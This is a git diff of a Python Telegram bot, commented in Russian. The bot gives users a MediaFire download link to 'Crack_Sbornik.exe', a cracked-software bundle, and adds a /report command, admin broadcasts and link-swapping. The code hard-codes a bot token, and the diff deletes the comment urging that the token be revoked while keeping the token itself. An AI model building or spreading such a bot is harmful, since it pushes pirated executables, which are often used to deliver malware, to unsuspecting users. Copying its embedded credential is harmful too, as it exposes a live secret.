@@ -4,12 +4,11 @@ from flask import Flask, request
 import telebot
 from telebot import types
 
-# ⚠️ ВСТАВЬ НОВЫЙ ТОКЕН (старый отзови у @BotFather) ⚠️
-TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"
+TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИ НА СВОЙ
 SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
 IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
 
-# ТВОЙ TELEGRAM ID
+# ТВОЙ TELEGRAM ID (узнай у @userinfobot)
 ADMIN_ID = 7859226148
 
 bot = telebot.TeleBot(TOKEN)
@@ -34,6 +33,63 @@ def update_cooldown(user_id):
 def is_admin(user_id):
     return user_id == ADMIN_ID
 
+# =============== КОМАНДА /report ===============
+@bot.message_handler(commands=['report'])
+def report_message(message):
+    user_id = message.from_user.id
+    user_name = message.from_user.first_name
+    user_username = f"@{message.from_user.username}" if message.from_user.username else "нет username"
+    
+    # Получаем текст жалобы (всё, что после /report)
+    report_text = message.text.replace('/report', '').strip()
+    
+    if not report_text:
+        bot.reply_to(message, "❌ Пожалуйста, напишите жалобу после команды.\n\nПример: `/report ссылка не работает`", parse_mode="Markdown")
+        return
+    
+    # Отправляем жалобу админу
+    admin_message = f"📢 **НОВАЯ ЖАЛОБА!**\n\n"
+    admin_message += f"👤 **От:** {user_name}\n"
+    admin_message += f"🆔 **ID:** `{user_id}`\n"
+    admin_message += f"📱 **Username:** {user_username}\n"
+    admin_message += f"📝 **Текст жалобы:**\n{report_text}\n"
+    admin_message += f"⏰ **Время:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
+    
+    try:
+        bot.send_message(ADMIN_ID, admin_message, parse_mode="Markdown")
+        
+        # Кнопка для быстрого ответа пользователю
+        keyboard = types.InlineKeyboardMarkup()
+        keyboard.add(types.InlineKeyboardButton("💬 Ответить пользователю", callback_data=f"reply_{user_id}"))
+        bot.send_message(ADMIN_ID, "🔧 Действия:", reply_markup=keyboard)
+        
+        bot.reply_to(message, "✅ Ваша жалоба отправлена администратору! Мы рассмотрим её в ближайшее время.")
+    except Exception as e:
+        bot.reply_to(message, "❌ Не удалось отправить жалобу. Попробуйте позже.")
+        print(f"Ошибка отправки жалобы: {e}")
+
+# Обработчик для кнопки "Ответить пользователю" (для админа)
+@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
+def reply_to_user(call):
+    if not is_admin(call.from_user.id):
+        bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
+        return
+    
+    user_id = int(call.data.split('_')[1])
+    bot.answer_callback_query(call.id)
+    
+    msg = bot.send_message(call.message.chat.id, f"✏️ Введите ответ для пользователя с ID `{user_id}`:", parse_mode="Markdown")
+    bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, user_id))
+
+def send_reply_to_user(message, user_id):
+    reply_text = message.text.strip()
+    try:
+        bot.send_message(user_id, f"📢 **Ответ администратора:**\n\n{reply_text}", parse_mode="Markdown")
+        bot.send_message(message.chat.id, f"✅ Ответ отправлен пользователю {user_id}")
+    except:
+        bot.send_message(message.chat.id, f"❌ Не удалось отправить ответ. Возможно, пользователь заблокировал бота.")
+
+# =============== ОСТАЛЬНЫЕ КОМАНДЫ ===============
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -68,7 +124,7 @@ def admin_panel(message):
     btn5 = types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image")
     keyboard.add(btn1, btn2, btn3, btn4, btn5)
     
-    bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=keyboard)
+    bot.send_message(message.chat.id, "🔧 **Админ-панель**", parse_mode="Markdown", reply_markup=keyboard)
 
 # Обработчик для обычных кнопок
 @bot.callback_query_handler(func=lambda call: call.data in ["download", "more", "share"])
@@ -88,7 +144,7 @@ def user_callback(call):
     if call.data == "download":
         download_count += 1
         bot.answer_callback_query(call.id, "✅ Ссылка отправлена!")
-        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
+        bot.send_message(call.message.chat.id, f"🔗 **Ссылка:**\n{SOFT_LINK}", parse_mode="Markdown")
     
     elif call.data == "more":
         bot.answer_callback_query(call.id, "📸 Картинка отправлена!")
@@ -96,7 +152,7 @@ def user_callback(call):
     
     elif call.data == "share":
         bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"👥 Поделиться ботом:\n\nhttps://t.me/{bot.get_me().username}")
+        bot.send_message(call.message.chat.id, f"👥 **Поделиться:**\n\nhttps://t.me/{bot.get_me().username}", parse_mode="Markdown")
 
 # Обработчик для админских кнопок
 @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
@@ -112,21 +168,21 @@ def admin_callback(call):
     bot.answer_callback_query(call.id)
     
     if call.data == "admin_stats":
-        bot.send_message(call.message.chat.id, f"📊 Статистика:\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
+        bot.send_message(call.message.chat.id, f"📊 **Статистика:**\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}", parse_mode="Markdown")
     
     elif call.data == "admin_users":
-        bot.send_message(call.message.chat.id, f"👥 Всего пользователей: {len(users)}")
+        bot.send_message(call.message.chat.id, f"👥 **Всего пользователей:** {len(users)}")
     
     elif call.data == "admin_change_link":
-        msg = bot.send_message(call.message.chat.id, "📝 Отправьте новую ссылку:")
+        msg = bot.send_message(call.message.chat.id, "📝 **Отправьте новую ссылку:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, change_link)
     
     elif call.data == "admin_change_image":
-        msg = bot.send_message(call.message.chat.id, "🖼 Отправьте новую ссылку на картинку:")
+        msg = bot.send_message(call.message.chat.id, "🖼 **Отправьте новую ссылку на картинку:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, change_image)
     
     elif call.data == "admin_broadcast":
-        msg = bot.send_message(call.message.chat.id, "📢 Введите текст для рассылки:")
+        msg = bot.send_message(call.message.chat.id, "📢 **Введите текст для рассылки:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, broadcast)
 
 def change_link(message):
@@ -144,17 +200,17 @@ def broadcast(message):
     success = 0
     fail = 0
     
-    bot.send_message(message.chat.id, "📢 Начинаю рассылку...")
+    bot.send_message(message.chat.id, "📢 **Начинаю рассылку...**", parse_mode="Markdown")
     
     for user_id in users:
         try:
-            bot.send_message(user_id, f"📢 Новость:\n\n{text}")
+            bot.send_message(user_id, f"📢 **Новость:**\n\n{text}", parse_mode="Markdown")
             success += 1
         except:
             fail += 1
         time.sleep(0.05)
     
-    bot.send_message(message.chat.id, f"✅ Рассылка завершена!\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")
+    bot.send_message(message.chat.id, f"✅ **Рассылка завершена!**\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")
 
 # Webhook для Render
 @app.route(f'/{TOKEN}', methods=['POST'])
@@ -171,11 +227,9 @@ def index():
     return "Bot is running!"
 
 if __name__ == "__main__":
-    # Удаляем старый webhook
     bot.remove_webhook()
     time.sleep(1)
     
-    # Устанавливаем новый webhook
     webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')}/{TOKEN}"
     bot.set_webhook(url=webhook_url)
     print(f"✅ Webhook установлен: {webhook_url}")
